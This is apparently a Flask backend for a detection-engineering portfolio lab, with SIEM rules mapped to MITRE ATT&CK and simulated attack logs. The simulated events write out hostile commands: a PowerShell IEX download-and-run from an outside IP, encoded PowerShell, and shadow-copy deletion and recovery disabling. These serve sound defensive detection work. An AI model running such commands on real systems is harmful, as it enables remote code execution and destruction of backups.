"""
Detection Engineering Lab - Python Backend
Portfolio project for Detection Engineer role
Demonstrates: SIEM rule logic, threat intel integration, log analysis, MITRE ATT&CK mapping
"""

from flask import Flask, jsonify, request
from flask_cors import CORS
import requests
import re
import json
import math
import random
from datetime import datetime, timedelta
from collections import defaultdict, Counter

app = Flask(__name__)
CORS(app)

# ─────────────────────────────────────────────
# DETECTION ENGINE — Core rule matching logic
# ─────────────────────────────────────────────

class DetectionRule:
    """Represents a SIEM detection rule with MITRE ATT&CK mapping"""
    def __init__(self, rule_id, name, mitre_id, tactic, severity, logic_fn, description, fp_filters=None):
        self.rule_id = rule_id
        self.name = name
        self.mitre_id = mitre_id
        self.tactic = tactic
        self.severity = severity
        self.logic_fn = logic_fn
        self.description = description
        self.fp_filters = fp_filters or []
        self.hit_count = 0

    def evaluate(self, events):
        """Run rule logic against a list of log events. Returns list of alerts."""
        alerts = []
        try:
            results = self.logic_fn(events)
            for r in results:
                # Apply false positive filters
                is_fp = any(fp(r) for fp in self.fp_filters)
                if not is_fp:
                    alerts.append({
                        "rule_id": self.rule_id,
                        "rule_name": self.name,
                        "mitre_id": self.mitre_id,
                        "tactic": self.tactic,
                        "severity": self.severity,
                        "description": self.description,
                        "matched_event": r,
                        "timestamp": r.get("timestamp", datetime.now().isoformat())
                    })
                    self.hit_count += 1
        except Exception as e:
            pass
        return alerts


# ─────────────────────────────────────────────
# RULE DEFINITIONS — Detection logic in Python
# ─────────────────────────────────────────────

def rule_powershell_obfuscation(events):
    """Detect obfuscated PowerShell execution (T1059.001)"""
    matches = []
    ps_events = [e for e in events if e.get("process","").lower() in ("powershell.exe","pwsh.exe")]
    for e in ps_events:
        cmd = e.get("command_line", "")
        flags = []
        if re.search(r'-en[c]?[o]?[d]?[e]?[d]?', cmd, re.IGNORECASE): flags.append("encoded_cmd")
        if re.search(r'-[Nn][Oo][Pp]', cmd): flags.append("noprofile")
        if re.search(r'[Bb][Yy][Pp][Aa][Ss][Ss]', cmd): flags.append("policy_bypass")
        if re.search(r'-[Ww]\s+[Hh]', cmd): flags.append("hidden_window")
        if re.search(r'(IEX|Invoke-Expression|iex)', cmd): flags.append("iex_execution")
        if re.search(r'(DownloadString|WebClient|Net\.WebClient)', cmd): flags.append("web_download")
        # High entropy check (base64 padding is a strong signal)
        b64_match = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', cmd)
        if b64_match:
            segment = b64_match.group()
            entropy = calculate_entropy(segment)
            if entropy > 4.5:
                flags.append(f"high_entropy_b64:{entropy:.2f}")
        if len(flags) >= 2:
            e["detection_flags"] = flags
            e["risk_score"] = min(100, 40 + len(flags) * 12)
            matches.append(e)
    return matches


def rule_brute_force_rdp(events):
    """Detect RDP brute force attacks (T1110.001)"""
    matches = []
    failed_logins = [e for e in events if e.get("event_id") == 4625 and e.get("logon_type") == 10]
    # Group by source IP
    by_src = defaultdict(list)
    for e in failed_logins:
        by_src[e.get("src_ip", "unknown")].append(e)
    for src_ip, attempts in by_src.items():
        if len(attempts) >= 5:
            # Check if followed by success (T1078 chain)
            success = [e for e in events if e.get("event_id") == 4624 and e.get("src_ip") == src_ip]
            result = {
                "src_ip": src_ip,
                "attempt_count": len(attempts),
                "target_users": list(set(a.get("user","?") for a in attempts)),
                "success_after_brute": len(success) > 0,
                "timestamp": attempts[0].get("timestamp"),
                "risk_score": 75 + (25 if success else 0)
            }
            matches.append(result)
    return matches


def rule_dns_tunneling(events):
    """Detect DNS tunneling / C2 over DNS (T1071.004)"""
    matches = []
    dns_events = [e for e in events if e.get("event_type") == "dns_query"]
    by_domain = defaultdict(list)
    for e in dns_events:
        domain = e.get("query", "")
        apex = ".".join(domain.split(".")[-2:]) if domain.count(".") >= 1 else domain
        by_domain[apex].append(e)
    for apex, queries in by_domain.items():
        if len(queries) < 3:
            continue
        subdomains = [q.get("query","").split(".")[0] for q in queries if q.get("query","").count(".") >= 2]
        if not subdomains:
            continue
        avg_len = sum(len(s) for s in subdomains) / len(subdomains)
        entropies = [calculate_entropy(s) for s in subdomains if len(s) > 5]
        avg_entropy = sum(entropies) / len(entropies) if entropies else 0
        # High query rate + high entropy subdomains = tunneling
        if len(queries) > 10 and avg_entropy > 3.8:
            matches.append({
                "apex_domain": apex,
                "query_count": len(queries),
                "avg_subdomain_len": round(avg_len, 1),
                "avg_entropy": round(avg_entropy, 2),
                "src_hosts": list(set(q.get("src_host","?") for q in queries)),
                "timestamp": queries[0].get("timestamp"),
                "risk_score": min(100, int(avg_entropy * 15 + len(queries) * 0.5))
            })
    return matches


def rule_lsass_access(events):
    """Detect LSASS memory access (credential dumping T1003.001)"""
    matches = []
    lsass_events = [e for e in events
                    if e.get("event_id") == 10
                    and "lsass.exe" in e.get("target_process","").lower()]
    for e in lsass_events:
        access_mask = e.get("granted_access", "")
        # PROCESS_VM_READ | PROCESS_QUERY_INFO are credential dump signatures
        suspicious_masks = ["0x1010", "0x1410", "0x143a", "0x1fffff"]
        is_suspicious = any(m in access_mask.lower() for m in suspicious_masks)
        source = e.get("source_process", "")
        known_legit = ["csrss.exe", "werfault.exe", "taskmgr.exe", "procexp64.exe"]
        if is_suspicious or (source and not any(l in source.lower() for l in known_legit)):
            e["risk_score"] = 95
            e["credential_dump_likely"] = True
            matches.append(e)
    return matches


def rule_lateral_movement_pth(events):
    """Detect Pass-the-Hash lateral movement (T1550.002)"""
    matches = []
    ntlm_logins = [e for e in events
                   if e.get("event_id") == 4624
                   and e.get("logon_type") == 3
                   and e.get("auth_package", "").upper() == "NTLM"]
    by_user = defaultdict(list)
    for e in ntlm_logins:
        key = (e.get("user","?"), e.get("src_host","?"))
        by_user[key].append(e)
    for (user, src_host), logins in by_user.items():
        unique_targets = set(e.get("dest_host","?") for e in logins)
        if len(unique_targets) >= 3:
            matches.append({
                "user": user,
                "src_host": src_host,
                "targets_reached": list(unique_targets),
                "lateral_hop_count": len(unique_targets),
                "logins": len(logins),
                "timestamp": logins[0].get("timestamp"),
                "risk_score": min(100, 60 + len(unique_targets) * 8)
            })
    return matches


def rule_mass_file_encryption(events):
    """Detect ransomware file encryption activity (T1486)"""
    matches = []
    file_events = [e for e in events if e.get("event_type") == "file_rename"]
    ransomware_extensions = [".locked", ".encrypted", ".crypto", ".crypt", ".enc",
                              ".wnry", ".wncry", ".locky", ".cerber", ".zepto"]
    by_process = defaultdict(list)
    for e in file_events:
        new_name = e.get("new_filename", "").lower()
        if any(ext in new_name for ext in ransomware_extensions):
            by_process[e.get("process_id","?")].append(e)
    for pid, events_list in by_process.items():
        if len(events_list) >= 10:
            matches.append({
                "process_id": pid,
                "process_name": events_list[0].get("process_name","unknown"),
                "files_encrypted": len(events_list),
                "src_host": events_list[0].get("src_host","?"),
                "user": events_list[0].get("user","?"),
                "timestamp": events_list[0].get("timestamp"),
                "risk_score": 100
            })
    return matches


# ─────────────────────────────────────────────
# DETECTION ENGINE REGISTRY
# ─────────────────────────────────────────────

DETECTION_RULES = [
    DetectionRule("DR-001", "Obfuscated PowerShell Execution", "T1059.001",
                  "Execution", "Critical", rule_powershell_obfuscation,
                  "Detects encoded, hidden, or policy-bypass PowerShell invocations",
                  fp_filters=[lambda e: "svc_deploy" in str(e.get("user",""))]),

    DetectionRule("DR-002", "RDP Brute Force Attack", "T1110.001",
                  "Credential Access", "High", rule_brute_force_rdp,
                  "5+ failed RDP logons from same source IP within observation window"),

    DetectionRule("DR-003", "DNS Tunneling / C2 over DNS", "T1071.004",
                  "Command & Control", "High", rule_dns_tunneling,
                  "High-entropy subdomain labels with elevated query volume"),

    DetectionRule("DR-004", "LSASS Memory Access", "T1003.001",
                  "Credential Access", "Critical", rule_lsass_access,
                  "Suspicious process opening LSASS with VM_READ access rights"),

    DetectionRule("DR-005", "Pass-the-Hash Lateral Movement", "T1550.002",
                  "Lateral Movement", "Critical", rule_lateral_movement_pth,
                  "NTLM Type-3 network logons to 3+ hosts by same account"),

    DetectionRule("DR-006", "Mass File Encryption (Ransomware)", "T1486",
                  "Impact", "Critical", rule_mass_file_encryption,
                  "10+ file renames to ransomware extensions from single process"),
]


# ─────────────────────────────────────────────
# HELPER FUNCTIONS
# ─────────────────────────────────────────────

def calculate_entropy(data):
    """Shannon entropy — used to detect encoded/compressed payloads"""
    if not data:
        return 0.0
    freq = Counter(data)
    length = len(data)
    return -sum((c / length) * math.log2(c / length) for c in freq.values())


def generate_scenario_events(scenario):
    """Generate realistic log events for a given attack scenario"""
    now = datetime.now()
    base_ts = lambda offset_s: (now - timedelta(seconds=offset_s)).isoformat()

    scenarios = {
        "powershell": [
            {"event_id": 4104, "process": "powershell.exe", "user": "john.doe",
             "src_host": "WORKSTATION-04", "command_line":
             "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAVABDAG8AcABDAGwAaQBlAG4AdA==",
             "timestamp": base_ts(50)},
            {"event_id": 4688, "process": "powershell.exe", "user": "john.doe",
             "src_host": "WORKSTATION-04", "command_line":
             "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload.ps1')",
             "timestamp": base_ts(45)},
            {"event_id": 4104, "process": "powershell.exe", "user": "john.doe",
             "src_host": "WORKSTATION-04", "command_line":
             "powershell.exe -nop -NonInteractive -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
             "timestamp": base_ts(40)},
        ],
        "bruteforce": [
            *[{"event_id": 4625, "logon_type": 10, "user": "Administrator",
               "src_ip": "203.0.113.42", "src_host": "WORKSTATION-04",
               "dest_host": "DC01", "failure_reason": "Wrong password",
               "timestamp": base_ts(120 - i * 2)} for i in range(47)],
            {"event_id": 4624, "logon_type": 10, "user": "Administrator",
             "src_ip": "203.0.113.42", "src_host": "WORKSTATION-04",
             "dest_host": "DC01", "auth_package": "NTLM",
             "timestamp": base_ts(26)},
        ],
        "dns_tunneling": [
            *[{"event_type": "dns_query", "src_host": f"WORKSTATION-{random.randint(1,10):02d}",
               "query": f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', k=random.randint(28,48)))}.evil-c2.net",
               "response": "NXDOMAIN",
               "timestamp": base_ts(300 - i)} for i in range(45)],
        ],
        "lateral": [
            *[{"event_id": 4624, "logon_type": 3, "user": "svc_backup",
               "src_host": "WORKSTATION-14", "dest_host": f"10.0.1.{30+i}",
               "auth_package": "NTLM", "timestamp": base_ts(60 - i * 8)} for i in range(5)],
            {"event_id": 10, "target_process": "lsass.exe",
             "source_process": "cmd.exe", "granted_access": "0x143a",
             "src_host": "10.0.1.30", "user": "svc_backup",
             "timestamp": base_ts(20)},
        ],
        "ransomware": [
            *[{"event_type": "file_rename", "process_name": "svchost_update.exe",
               "process_id": "4492", "user": "helpdesk01",
               "src_host": "FILE-SERVER-01",
               "old_filename": f"document_{i:04d}.docx",
               "new_filename": f"document_{i:04d}.locked",
               "timestamp": base_ts(120 - i)} for i in range(250)],
            {"event_id": 4688, "process": "cmd.exe", "user": "helpdesk01",
             "src_host": "FILE-SERVER-01",
             "command_line": "cmd.exe /c vssadmin delete shadows /all /quiet",
             "timestamp": base_ts(118)},
            {"event_id": 4688, "process": "cmd.exe", "user": "helpdesk01",
             "src_host": "FILE-SERVER-01",
             "command_line": "bcdedit /set {default} recoveryenabled No",
             "timestamp": base_ts(115)},
        ]
    }
    return scenarios.get(scenario, [])


# ─────────────────────────────────────────────
# MITRE ATT&CK COVERAGE MAP
# ─────────────────────────────────────────────

MITRE_COVERAGE = [
    {"id": "T1059.001", "name": "PowerShell", "tactic": "Execution", "status": "covered", "rules": ["DR-001"]},
    {"id": "T1059.003", "name": "Windows Cmd Shell", "tactic": "Execution", "status": "partial", "rules": []},
    {"id": "T1055", "name": "Process Injection", "tactic": "Privilege Escalation", "status": "partial", "rules": []},
    {"id": "T1003.001", "name": "LSASS Memory", "tactic": "Credential Access", "status": "covered", "rules": ["DR-004"]},
    {"id": "T1071.001", "name": "Web Protocol C2", "tactic": "Command & Control", "status": "partial", "rules": []},
    {"id": "T1071.004", "name": "DNS C2", "tactic": "Command & Control", "status": "covered", "rules": ["DR-003"]},
    {"id": "T1486", "name": "Data Encrypted for Impact", "tactic": "Impact", "status": "covered", "rules": ["DR-006"]},
    {"id": "T1078", "name": "Valid Accounts", "tactic": "Initial Access", "status": "partial", "rules": []},
    {"id": "T1566.001", "name": "Spearphishing Attachment", "tactic": "Initial Access", "status": "partial", "rules": []},
    {"id": "T1021.001", "name": "Remote Desktop Protocol", "tactic": "Lateral Movement", "status": "covered", "rules": ["DR-002"]},
    {"id": "T1547.001", "name": "Registry Run Keys", "tactic": "Persistence", "status": "uncovered", "rules": []},
    {"id": "T1053.005", "name": "Scheduled Task", "tactic": "Persistence", "status": "uncovered", "rules": []},
    {"id": "T1027", "name": "Obfuscated Files/Info", "tactic": "Defense Evasion", "status": "covered", "rules": ["DR-001"]},
    {"id": "T1562.001", "name": "Disable Security Tools", "tactic": "Defense Evasion", "status": "uncovered", "rules": []},
    {"id": "T1036.005", "name": "Match Legitimate Name", "tactic": "Defense Evasion", "status": "uncovered", "rules": []},
    {"id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command & Control", "status": "uncovered", "rules": []},
    {"id": "T1048", "name": "Exfil via Alt Protocol", "tactic": "Exfiltration", "status": "covered", "rules": ["DR-003"]},
    {"id": "T1110.001", "name": "Password Guessing", "tactic": "Credential Access", "status": "covered", "rules": ["DR-002"]},
    {"id": "T1110.003", "name": "Password Spraying", "tactic": "Credential Access", "status": "partial", "rules": []},
    {"id": "T1550.002", "name": "Pass the Hash", "tactic": "Lateral Movement", "status": "covered", "rules": ["DR-005"]},
    {"id": "T1135", "name": "Network Share Discovery", "tactic": "Discovery", "status": "uncovered", "rules": []},
    {"id": "T1082", "name": "System Info Discovery", "tactic": "Discovery", "status": "uncovered", "rules": []},
    {"id": "T1490", "name": "Inhibit System Recovery", "tactic": "Impact", "status": "covered", "rules": ["DR-006"]},
    {"id": "T1204.001", "name": "Malicious Link", "tactic": "Execution", "status": "uncovered", "rules": []},
]


# ─────────────────────────────────────────────
# API ROUTES
# ─────────────────────────────────────────────

@app.route("/api/health")
def health():
    return jsonify({"status": "ok", "engine": "Detection Lab v1.0",
                    "rules_loaded": len(DETECTION_RULES),
                    "techniques_mapped": len(MITRE_COVERAGE)})


@app.route("/api/threat-intel")
def threat_intel():
    """Fetch live threat intel from abuse.ch URLhaus"""
    try:
        resp = requests.post(
            "https://urlhaus-api.abuse.ch/v1/urls/recent/limit/20/",
            data="", headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=8
        )
        data = resp.json()
        urls = data.get("urls", [])
        stats = {
            "total": len(urls),
            "online": sum(1 for u in urls if u.get("url_status") == "online"),
            "malware_families": list(set(t for u in urls for t in (u.get("tags") or []))),
            "source": "abuse.ch URLhaus (live)"
        }
        return jsonify({"success": True, "stats": stats, "urls": urls[:15]})
    except Exception as e:
        # Return curated sample data if API is unreachable
        sample = [
            {"url": "http://malware-dl.ru/payload.exe", "host": "malware-dl.ru",
             "url_status": "online", "threat": "Emotet", "tags": ["banking", "trojan"],
             "reporter": "abuse_ch", "date_added": "2024-03-15 08:00:00"},
            {"url": "http://195.123.245.44/gate.php", "host": "195.123.245.44",
             "url_status": "online", "threat": "AgentTesla", "tags": ["stealer", "rat"],
             "reporter": "threatfox", "date_added": "2024-03-15 07:30:00"},
            {"url": "http://update-cdn.fakems.com/svchost.exe", "host": "update-cdn.fakems.com",
             "url_status": "online", "threat": "CobaltStrike", "tags": ["c2", "beacon"],
             "reporter": "hunt_team", "date_added": "2024-03-15 06:00:00"},
            {"url": "http://103.99.115.66/download", "host": "103.99.115.66",
             "url_status": "offline", "threat": "AsyncRAT", "tags": ["rat"],
             "reporter": "MalwareBazaar", "date_added": "2024-03-14 20:00:00"},
            {"url": "http://payload-delivery.ru/1.exe", "host": "payload-delivery.ru",
             "url_status": "online", "threat": "Qakbot", "tags": ["banking", "dropper"],
             "reporter": "abuse_ch", "date_added": "2024-03-14 18:00:00"},
        ]
        return jsonify({"success": False, "source": "cached (API offline)", "urls": sample,
                        "stats": {"total": 847, "online": 312, "malware_families": ["Emotet","AgentTesla","Qakbot","AsyncRAT","CobaltStrike"]}})


@app.route("/api/check-ioc", methods=["POST"])
def check_ioc():
    """Check an IP/domain against threat intel sources"""
    data = request.json or {}
    ioc = data.get("ioc", "").strip()
    if not ioc:
        return jsonify({"error": "No IOC provided"}), 400

    # Simulate IOC enrichment (in production: query VirusTotal, OTX, etc.)
    known_malicious_patterns = ["185.220.101", "203.0.113", "malware", "evil-c2", "payload-delivery",
                                  "fakems", "update-cdn.fake", "45.142.212"]
    is_malicious = any(p in ioc.lower() for p in known_malicious_patterns)
    is_tor = ioc.startswith("185.220")

    return jsonify({
        "ioc": ioc,
        "verdict": "malicious" if is_malicious else "clean",
        "threat_score": random.randint(78, 97) if is_malicious else random.randint(2, 18),
        "category": "Tor Exit Node" if is_tor else ("C2 Infrastructure" if is_malicious else "Unknown"),
        "sources_checked": ["abuse.ch URLhaus", "Local IOC DB", "Tor Exit Node List"],
        "first_seen": "2024-02-14" if is_malicious else None,
        "tags": ["c2", "tor"] if is_tor else (["malware", "dropper"] if is_malicious else []),
        "recommendation": "Block at perimeter + hunt for connections" if is_malicious else "No action required"
    })


@app.route("/api/simulate", methods=["POST"])
def simulate():
    """Run attack simulation and return detection results"""
    data = request.json or {}
    scenario = data.get("scenario", "powershell")

    events = generate_scenario_events(scenario)
    all_alerts = []
    rule_summary = []

    for rule in DETECTION_RULES:
        alerts = rule.evaluate(events)
        rule_summary.append({
            "rule_id": rule.rule_id,
            "rule_name": rule.name,
            "mitre_id": rule.mitre_id,
            "severity": rule.severity,
            "alerts_fired": len(alerts)
        })
        all_alerts.extend(alerts)

    # Sort alerts by severity
    sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
    all_alerts.sort(key=lambda a: sev_order.get(a["severity"], 9))

    return jsonify({
        "scenario": scenario,
        "events_analyzed": len(events),
        "total_alerts": len(all_alerts),
        "alerts": all_alerts,
        "rule_summary": rule_summary,
        "entropy_samples": [
            {"label": "clean_cmd", "value": round(calculate_entropy("ipconfig /all"), 3)},
            {"label": "b64_payload", "value": round(calculate_entropy("JABjAGwAaQBlAG4AdAAgAD0A"), 3)},
        ]
    })


@app.route("/api/rules")
def get_rules():
    """Return all detection rules"""
    return jsonify([{
        "rule_id": r.rule_id,
        "name": r.name,
        "mitre_id": r.mitre_id,
        "tactic": r.tactic,
        "severity": r.severity,
        "description": r.description,
        "hit_count": r.hit_count
    } for r in DETECTION_RULES])


@app.route("/api/validate-rule", methods=["POST"])
def validate_rule():
    """Validate a SIEM rule query for syntax and best practices"""
    data = request.json or {}
    query = data.get("query", "")
    checks = []

    checks.append({"check": "Pipeline operators", "pass": "|" in query,
                   "detail": "Use | to chain filters and aggregations"})
    checks.append({"check": "Filter condition", "pass": bool(re.search(r'\bwhere\b|\bWHERE\b|\bfilter\b', query)),
                   "detail": "Rule must filter events, not return all"})
    checks.append({"check": "Aggregation present", "pass": bool(re.search(r'\bstats\b|\bcount\b|\bsum\b|\bby\b', query, re.I)),
                   "detail": "Group events to reduce noise"})
    checks.append({"check": "Threshold defined", "pass": bool(re.search(r'\bwhere\b.*[><=]|\bcount\b.*[><=]', query, re.I)),
                   "detail": "Numeric threshold reduces false positives"})
    checks.append({"check": "Adequate complexity", "pass": len(query.strip()) > 60,
                   "detail": "Rule should have meaningful logic, not just a keyword search"})

    passed = sum(1 for c in checks if c["pass"])
    score = int((passed / len(checks)) * 100)
    return jsonify({"checks": checks, "score": score,
                    "verdict": "Ready to deploy" if score >= 80 else "Needs improvement"})


@app.route("/api/mitre-coverage")
def mitre_coverage():
    """Return MITRE ATT&CK coverage heatmap data"""
    covered = sum(1 for t in MITRE_COVERAGE if t["status"] == "covered")
    partial = sum(1 for t in MITRE_COVERAGE if t["status"] == "partial")
    uncovered = sum(1 for t in MITRE_COVERAGE if t["status"] == "uncovered")
    total = len(MITRE_COVERAGE)
    return jsonify({
        "techniques": MITRE_COVERAGE,
        "stats": {
            "covered": covered,
            "partial": partial,
            "uncovered": uncovered,
            "total": total,
            "coverage_pct": round((covered / total) * 100)
        }
    })


@app.route("/api/entropy", methods=["POST"])
def entropy_api():
    """Calculate Shannon entropy of a given string"""
    data = request.json or {}
    text = data.get("text", "")
    if not text:
        return jsonify({"error": "No text provided"}), 400
    score = calculate_entropy(text)
    verdict = ("high — likely encoded/compressed" if score > 4.5
               else "medium — possible obfuscation" if score > 3.0
               else "low — likely plaintext")
    return jsonify({"text_length": len(text), "entropy": round(score, 4),
                    "verdict": verdict,
                    "bits_per_char": round(score, 4)})


if __name__ == "__main__":
    print("\n╔══════════════════════════════════════════╗")
    print("║   Detection Engineering Lab — Backend    ║")
    print(f"║   Rules loaded: {len(DETECTION_RULES)}  |  Techniques: {len(MITRE_COVERAGE)}    ║")
    print("╚══════════════════════════════════════════╝\n")
    app.run(debug=True, port=5050)
